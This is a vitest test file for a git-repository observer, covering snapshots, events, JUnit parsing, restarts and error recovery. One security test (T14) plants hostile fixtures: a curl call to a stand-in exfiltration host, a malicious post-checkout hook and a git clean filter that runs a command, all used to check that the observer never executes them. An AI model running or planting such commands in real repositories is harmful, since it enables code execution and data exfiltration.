import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { existsSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { ProjectObserver } from './observer.js';
import { ObserverError } from './errors.js';
import { createGitRunner } from './git/run.js';
import {
  SAMPLE_JUNIT_BAD,
  SAMPLE_JUNIT_PASS,
  commitAll,
  createGitRepo,
  git,
  writeFiles,
} from './testkit/git-fixture.js';
import type { EventType } from './contracts.js';

let dir: string;
let observer: ProjectObserver;
let now = new Date('2026-10-28T08:00:00.000Z');

function typesOf(projectId: string): EventType[] {
  return observer.listEvents(projectId, { limit: 200 }).events.map((event) => event.type);
}

describe('Project Observer P0', () => {
  beforeEach(async () => {
    dir = await mkdtemp(path.join(tmpdir(), 'hearth-obs-'));
    now = new Date('2026-10-28T08:00:00.000Z');
    observer = new ProjectObserver({
      dbPath: path.join(dir, 'observer.sqlite'),
      clock: () => now,
      watchEnabled: false,
      gapThresholdMs: 60_000,
      debounceMs: 40,
    });
  });

  afterEach(async () => {
    await observer.stop();
    observer.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('T01 registers three fixtures and rejects duplicate paths', async () => {
    const a = await createGitRepo(dir, 'alpha');
    const b = await createGitRepo(dir, 'beta');
    const c = await createGitRepo(dir, 'gamma');
    const pa = await observer.registerProject(a, { name: 'Alpha' });
    const pb = await observer.registerProject(b, { name: 'Beta' });
    const pc = await observer.registerProject(c, { name: 'Gamma' });
    expect(new Set([pa.id, pb.id, pc.id]).size).toBe(3);
    expect(observer.listProjects()).toHaveLength(3);
    await expect(observer.registerProject(a)).rejects.toMatchObject({ code: 'DUPLICATE_PATH' });
  });

  it('T02 first scan of a clean repo does not fabricate HEAD change', async () => {
    const root = await createGitRepo(dir, 'clean');
    const project = await observer.registerProject(root);
    const events = typesOf(project.id);
    expect(events).toEqual(['PROJECT_REGISTERED']);
    const snapshot = observer.getLatestSnapshot(project.id);
    expect(snapshot?.worktree.clean).toBe(true);
    expect(snapshot?.unborn).toBe(false);
    expect(snapshot?.headSha).toMatch(/^[0-9a-f]{40}$/);
  });

  it('T03 ten rapid dirty hints produce one worktree event', async () => {
    const root = await createGitRepo(dir, 'burst');
    const project = await observer.registerProject(root);
    for (let i = 0; i < 10; i += 1) {
      await writeFile(path.join(root, 'burst-notes.observer.txt'), `edit ${i}\n`);
      observer.hintDirty(project.id, 'burst-notes.observer.txt');
    }
    await vi.waitFor(
      () => {
        const worktreeEvents = typesOf(project.id).filter((type) => type === 'WORKTREE_STATE_CHANGED');
        expect(worktreeEvents.length).toBe(1);
      },
      { timeout: 8_000 },
    );
    expect(observer.getLatestSnapshot(project.id)?.worktree.clean).toBe(false);
  });

  it('T04 commit and branch checkout emit traceable git events', async () => {
    const root = await createGitRepo(dir, 'flow');
    const project = await observer.registerProject(root);
    await writeFiles(root, { 'src/app.ts': 'export const n = 1;\n' });
    await commitAll(root, 'add app');
    now = new Date('2026-10-28T08:01:00.000Z');
    await observer.scanProject(project.id, 'manual');
    await git(root, ['checkout', '-b', 'feature']);
    now = new Date('2026-10-28T08:02:00.000Z');
    await observer.scanProject(project.id, 'manual');
    const events = observer.listEvents(project.id, { limit: 20 }).events;
    expect(events.some((event) => event.type === 'REPOSITORY_HEAD_CHANGED')).toBe(true);
    expect(events.some((event) => event.type === 'REPOSITORY_BRANCH_CHANGED')).toBe(true);
    const headEvent = events.find((event) => event.type === 'REPOSITORY_HEAD_CHANGED');
    expect(headEvent?.evidence.source).toBe('git');
    expect(headEvent?.fromSnapshotId).toBeTruthy();
    expect(headEvent?.toSnapshotId).toBeTruthy();
  });

  it('T05 repeated scans of the same state are idempotent', async () => {
    const root = await createGitRepo(dir, 'stable');
    const project = await observer.registerProject(root);
    const first = observer.getLatestSnapshot(project.id);
    await observer.scanProject(project.id, 'manual');
    await observer.scanProject(project.id, 'manual');
    expect(observer.getLatestSnapshot(project.id)?.fingerprint).toBe(first?.fingerprint);
    expect(typesOf(project.id)).toEqual(['PROJECT_REGISTERED']);
  });

  it('T06 A→B→A records two real transitions', async () => {
    const root = await createGitRepo(dir, 'toggle');
    const project = await observer.registerProject(root);
    await writeFile(path.join(root, 'dirty.txt'), 'b\n');
    now = new Date('2026-10-28T08:01:00.000Z');
    await observer.scanProject(project.id, 'manual');
    await rm(path.join(root, 'dirty.txt'));
    now = new Date('2026-10-28T08:02:00.000Z');
    await observer.scanProject(project.id, 'manual');
    const worktree = typesOf(project.id).filter((type) => type === 'WORKTREE_STATE_CHANGED');
    expect(worktree).toHaveLength(2);
  });

  it('T07 valid JUnit report is observed with source time', async () => {
    const root = await createGitRepo(dir, 'junit-ok', {
      files: { 'README.md': '# t\n', 'reports/junit.xml': SAMPLE_JUNIT_PASS },
    });
    const project = await observer.registerProject(root, {
      reports: [{ format: 'junit-xml', relativePath: 'reports/junit.xml' }],
    });
    const snapshot = observer.getLatestSnapshot(project.id);
    expect(snapshot?.test.result).toBe('PASS');
    expect(snapshot?.test.evidenceQuality).toBe('OBSERVED');
    expect(snapshot?.test.headBound).toBe(false);
    expect(snapshot?.test.generatedAt).toBe('2026-10-28T08:00:00Z');
    expect(JSON.stringify(snapshot?.test)).not.toContain('secret');
    await writeFile(path.join(root, 'notes-only.txt'), 'dirty\n');
    now = new Date('2026-10-28T08:03:00.000Z');
    await observer.scanProject(project.id, 'manual');
    expect(observer.getLatestSnapshot(project.id)?.test.stale).toBe(false);
    expect(observer.getLatestSnapshot(project.id)?.test.evidenceQuality).toBe('OBSERVED');
  });

  it('T08 missing report is UNKNOWN, never PASS', async () => {
    const root = await createGitRepo(dir, 'no-report');
    const project = await observer.registerProject(root);
    const snapshot = observer.getLatestSnapshot(project.id);
    expect(snapshot?.test.result).toBe('UNKNOWN');
    expect(snapshot?.test.evidenceQuality).toBe('UNKNOWN');
  });

  it('T12 parses Chinese and space filenames via porcelain', async () => {
    const root = await createGitRepo(dir, 'unicode');
    const project = await observer.registerProject(root);
    await writeFile(path.join(root, '中文 空格.txt'), 'hi\n');
    now = new Date('2026-10-28T08:01:00.000Z');
    await observer.scanProject(project.id, 'manual');
    const snapshot = observer.getLatestSnapshot(project.id);
    expect(snapshot?.worktree.untracked).toBe(1);
    expect(snapshot?.worktree.clean).toBe(false);
  });

  it('T13 handles unborn, detached HEAD, and git worktree', async () => {
    const unbornRoot = await createGitRepo(dir, 'unborn', { commit: false });
    const unborn = await observer.registerProject(unbornRoot, { name: 'unborn' });
    expect(observer.getLatestSnapshot(unborn.id)?.unborn).toBe(true);

    const detachedRoot = await createGitRepo(dir, 'detach');
    await git(detachedRoot, ['checkout', '--detach', 'HEAD']);
    const detached = await observer.registerProject(detachedRoot, { name: 'detach' });
    expect(observer.getLatestSnapshot(detached.id)?.detached).toBe(true);

    const base = await createGitRepo(dir, 'wt-main');
    const wtPath = path.join(dir, 'wt-extra');
    await git(base, ['worktree', 'add', '--detach', wtPath]);
    const main = await observer.registerProject(base, { name: 'wt-main' });
    const extra = await observer.registerProject(wtPath, { name: 'wt-extra' });
    expect(main.id).not.toBe(extra.id);
    expect(observer.getLatestSnapshot(main.id)?.gitIdentity).toBe(
      observer.getLatestSnapshot(extra.id)?.gitIdentity,
    );
  });

  it('T15 survives restart without duplicating events', async () => {
    const root = await createGitRepo(dir, 'persist');
    const project = await observer.registerProject(root);
    const dbPath = path.join(dir, 'observer.sqlite');
    await observer.stop();
    observer.close();
    observer = new ProjectObserver({
      dbPath,
      clock: () => now,
      watchEnabled: false,
      gapThresholdMs: 60_000,
    });
    expect(observer.listProjects()).toHaveLength(1);
    await observer.scanProject(project.id, 'manual');
    expect(typesOf(project.id)).toEqual(['PROJECT_REGISTERED']);
  });
});

describe('T14 command injection files are data', () => {
  it('does not execute planted hooks or network commands', async () => {
    const dirLocal = await mkdtemp(path.join(tmpdir(), 'hearth-obs-sec-'));
    const calls: string[][] = [];
    const base = createGitRunner();
    const observerLocal = new ProjectObserver({
      dbPath: path.join(dirLocal, 'observer.sqlite'),
      watchEnabled: false,
      gitRunner: async (args, options) => {
        calls.push([...args]);
        return base(args, options);
      },
    });
    const originalFetch = globalThis.fetch;
    let fetched = false;
    globalThis.fetch = (async () => {
      fetched = true;
      throw new Error('network should not be used');
    }) as typeof fetch;
    try {
      const root = await createGitRepo(dirLocal, 'hostile', {
        files: {
          'README.md': '# x\n',
          'please-run.sh': 'curl http://evil.example/exfil\n',
          '.git/hooks/post-checkout': '#!/bin/sh\necho pwned > /tmp/observer-pwned\n',
        },
      });
      await observerLocal.registerProject(root);
      await observerLocal.scanProject(observerLocal.listProjects()[0]!.id, 'manual');
      expect(fetched).toBe(false);
      expect(calls.every((args) => !args.includes('fetch') && !args.includes('pull') && !args.includes('push'))).toBe(
        true,
      );
      expect(calls.every((args) => args[0] === 'rev-parse' || args[0] === 'status' || args[0] === 'merge-base' || args[0] === 'log')).toBe(
        true,
      );

      const filtered = await createGitRepo(dirLocal, 'filters', { files: { 'README.md': '# x\n' } });
      await git(filtered, ['config', 'filter.evil.clean', 'touch PWNED-FILTER']);
      await writeFiles(filtered, { '.gitattributes': '* filter=evil\n', 'README.md': '# dirty\n' });
      await observerLocal.registerProject(filtered);
      expect(existsSync(path.join(filtered, 'PWNED-FILTER'))).toBe(false);
    } finally {
      globalThis.fetch = originalFetch;
      await observerLocal.stop();
      observerLocal.close();
      await rm(dirLocal, { recursive: true, force: true });
    }
  });
});

describe('error isolation and recovery', () => {
  let localDir: string;
  let local: ProjectObserver;
  let clock = new Date('2026-10-28T08:00:00.000Z');

  beforeEach(async () => {
    localDir = await mkdtemp(path.join(tmpdir(), 'hearth-obs-r-'));
    clock = new Date('2026-10-28T08:00:00.000Z');
    local = new ProjectObserver({
      dbPath: path.join(localDir, 'observer.sqlite'),
      clock: () => clock,
      watchEnabled: false,
      gapThresholdMs: 60_000,
    });
  });

  afterEach(async () => {
    await local.stop();
    local.close();
    await rm(localDir, { recursive: true, force: true });
  });

  it('T09 corrupt report is adapter error; sibling project still scans', async () => {
    const badRoot = await createGitRepo(localDir, 'bad', {
      files: { 'README.md': '# b\n', 'reports/junit.xml': SAMPLE_JUNIT_BAD },
    });
    const goodRoot = await createGitRepo(localDir, 'good');
    const bad = await local.registerProject(badRoot, {
      reports: [{ format: 'junit-xml', relativePath: 'reports/junit.xml' }],
    });
    const good = await local.registerProject(goodRoot);
    clock = new Date('2026-10-28T08:01:00.000Z');
    await local.scanProject(good.id, 'manual');
    const badSnap = local.getLatestSnapshot(bad.id);
    expect(badSnap?.test.result).toBe('UNKNOWN');
    expect(local.listEvents(bad.id, { types: ['ADAPTER_ERROR'] }).events.length).toBeGreaterThan(0);
    const adapterCount = local.listEvents(bad.id, { types: ['ADAPTER_ERROR'] }).events.length;
    clock = new Date('2026-10-28T08:02:00.000Z');
    await local.scanProject(bad.id, 'manual');
    expect(local.listEvents(bad.id, { types: ['ADAPTER_ERROR'] }).events.length).toBe(adapterCount);
    expect(local.getLatestSnapshot(good.id)?.accessibility).toBe('OK');
    expect(local.getObserverHealth(good.id).collectionStatus).toBe('OK');
  });

  it('T10 restart after HEAD change emits gap, not fabricated intermediates', async () => {
    const root = await createGitRepo(localDir, 'gap');
    const project = await local.registerProject(root);
    const dbPath = path.join(localDir, 'observer.sqlite');
    await local.stop();
    local.close();
    await writeFiles(root, { 'later.ts': 'export {}\n' });
    await commitAll(root, 'later');
    clock = new Date('2026-10-28T09:00:00.000Z');
    local = new ProjectObserver({
      dbPath,
      clock: () => clock,
      watchEnabled: false,
      gapThresholdMs: 60_000,
    });
    await local.scanProject(project.id, 'startup');
    const types = local.listEvents(project.id, { limit: 50 }).events.map((event) => event.type);
    expect(types).toContain('OBSERVATION_GAP');
    expect(types).toContain('REPOSITORY_HEAD_CHANGED');
    expect(types.filter((type) => type === 'REPOSITORY_HEAD_CHANGED')).toHaveLength(1);
    const gap = local.listEvents(project.id, { types: ['OBSERVATION_GAP'] }).events[0];
    expect((gap?.payload as { gapMs: number }).gapMs).toBeGreaterThan(60_000);
  });

  it('T11 deleted repo becomes UNAVAILABLE and keeps history', async () => {
    const root = await createGitRepo(localDir, 'gone');
    const project = await local.registerProject(root);
    const before = local.listEvents(project.id, { limit: 20 }).events.length;
    await rm(root, { recursive: true, force: true });
    clock = new Date('2026-10-28T08:10:00.000Z');
    await local.scanProject(project.id, 'manual');
    expect(local.getObserverHealth(project.id).collectionStatus).toBe('UNAVAILABLE');
    expect(local.listEvents(project.id, { types: ['REPOSITORY_UNAVAILABLE'] }).events).toHaveLength(1);
    expect(local.listEvents(project.id, { limit: 20 }).events.length).toBeGreaterThanOrEqual(before);
  });

  it('T16 reconcile recovers missed watch events', async () => {
    const root = await createGitRepo(localDir, 'missed');
    const project = await local.registerProject(root);
    await writeFile(path.join(root, 'missed.txt'), 'x\n');
    clock = new Date('2026-10-28T08:06:00.000Z');
    await local.scanProject(project.id, 'reconcile');
    expect(local.getLatestSnapshot(project.id)?.worktree.untracked).toBe(1);
    expect(local.listEvents(project.id, { types: ['WORKTREE_STATE_CHANGED'] }).events).toHaveLength(1);
  });

  it('registering a non-git directory fails without creating a project', async () => {
    const plain = path.join(localDir, 'plain');
    await writeFiles(plain, { 'a.txt': 'x' });
    await expect(local.registerProject(plain)).rejects.toBeInstanceOf(ObserverError);
    expect(local.listProjects()).toHaveLength(0);
  });
});
